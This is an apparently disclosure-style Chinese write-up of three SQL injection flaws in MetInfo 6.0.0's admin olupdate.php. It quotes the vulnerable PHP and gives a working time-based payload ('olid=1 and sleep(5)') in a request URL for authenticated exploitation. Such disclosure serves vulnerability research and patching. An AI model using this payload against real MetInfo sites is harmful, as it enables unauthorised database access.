分析
----
问题代码出在MetInfo6.0.0/admin/system/olupdate.php 有三处sql注入
第一处 57行 dl_error函数内 这个函数在代码运行出问题时才会调用，实际利用比较难
```php
    if($type==2){
        if($addr)deldir("../app/$addr/");
        $query="select * from $met_app where no=$olid and download=1";//注入
        $appver=$db->get_one($query);
        $verold=is_array($appver)?$appver['ver']:0;
        echo "<a href='http://$met_host/dl/app.php' onclick=\"return olupdate('$olid','$verold','testc');\">{$lang_redownload}</a>"; 
    }
```
第二处 453行 第三处 455行 利用条件 action==‘update’ type==2
```php
}else if($type==2){
        $query="select * from $met_app where no=$olid and download=0";//注入
        $app=$db->get_one($query);
        $query="select * from $met_app where no=$olid and download=1";//注入
        if($db->get_one($query)){
            $query="update $met_app set name='$app[name]',ver='$app[ver]',img='$app[img]',info='$app[info]',file='$app[file]',power='$app[power]',sys='$app[sys]',site='$app[site]',url='$app[url]' where no='$app[no]' and download=1";
            $db->query($query);
        }
```
注入的参数都一样是$olid

利用
----
1.登录后台

2.请求 localhost/metinfo6.0.0/admin/system/olupdate.php?action=update&type=2&olid=1 and sleep(5)

3.成功注入

![](https://github.com/white-cell/bugs/raw/master/MetInfo/sql.jpg)